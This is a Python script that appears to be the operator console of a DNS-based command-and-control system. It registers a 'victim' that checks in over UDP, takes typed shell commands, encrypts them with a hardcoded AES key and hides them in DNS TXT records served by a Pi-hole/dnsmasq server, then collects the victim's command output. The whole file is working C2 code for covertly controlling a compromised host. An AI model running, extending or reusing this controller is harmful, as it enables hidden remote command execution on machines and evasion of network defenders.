#!/usr/bin/env python

from Crypto.Cipher import AES
import argparse
import os
import platform
import subprocess
import datetime
import time
import socket

import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

VICTIM_LIST = 'VICTIMS'
SERVER_ADDR = 'http://10.150.0.7:8888/weather'
HOST = ''
DNS_IP = "10.150.0.8"
DNS_PORT = 53
DNS_SIGNAL_PORT = 1004
DNS_RECORD_FILE = '/etc/dnsmasq.d/02-lan.conf'

class TryLoop:

    def __init__(self, profile):
        self.profile = profile
        self.victim_details = dict()

    def start(self):
        print('Starting drill...')
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('', DNS_SIGNAL_PORT))
        data, addr = sock.recvfrom(512)
        print('Connected!')
        mac, ip, host, platform, pid = (data.decode('utf-8')).split(';')
        self.victim_details['mac'] = mac
        self.victim_details['ip'] = ip
        self.profile['host'] = host
        self.profile['platform'] = platform
        self.profile['pid'] = pid
        while True:
            command = str(input())
            to = str(input())
            output = self.exec(command, to, sock)
            print(output)

    def exec(self, command, timeout, sock):
        entry = "txt-record=cmd.bark-bark.tree,"
        encryptedCommand = self.encrypt(command)
        entry += encryptedCommand.decode('utf-8')
        entry += ";"
        entry += timeout
        entry += "\n"

        with open(DNS_RECORD_FILE, "w") as f:
            f.write(entry)

        subprocess.call(['/usr/sbin/service', 'pihole-FTL', 'restart'], shell=False)
        time.sleep(3)
        print("Sending command signal...")
        exec_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        exec_sock.sendto("1".encode('utf-8'), (self.victim_details['ip'], DNS_PORT))
        print("Receiving output from", self.victim_details['ip'], "...")
        data, addr = sock.recvfrom(512)
        out = data.decode('utf-8')
        
        return out



    # utils
    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        key = hashlib.sha256("g0vwQgZcBCfFNduQCGFVUvudv8gUMPYp".encode()).digest()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def _pad(self, s):
        bs = AES.block_size
        return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)

def build_profile(server_addr):
    return dict(
        server=server_addr,
        executors=['sh']
    )

if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start here')
    parser.add_argument('-W', '--website', required=False, default='http://10.150.0.7:8888/weather')
    args = parser.parse_args()
    SERVER_ADDR = args.website
    p = build_profile('%s' % args.website)
    l = TryLoop(profile=p)
    l.start()
